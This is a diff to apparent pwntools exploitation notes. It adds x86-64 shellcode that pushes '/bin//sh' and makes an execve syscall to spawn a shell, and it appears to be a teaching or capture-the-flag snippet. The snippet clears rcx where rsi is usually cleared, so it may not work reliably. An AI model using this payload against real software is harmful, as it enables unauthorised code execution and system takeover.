@@ -220,11 +220,22 @@ OR
 context.arch = 'amd64'
 ...
 
+context.arch = 'amd64'
+p = elf.process()
+
 shellcode = asm(
-         f"""
-         instruction assembly
-         """
-''')
+        f'''
+        xor rdi, rdi
+        push rdi
+        mov rdi, 0x68732f2f6e69622f
+        push rdi
+        mov rdi, rsp
+        xor rdx, rdx
+        xor rcx, rcx
+        xor rax, rax
+        add al, 0x3b
+        syscall
+        ''')
 ```
 
 
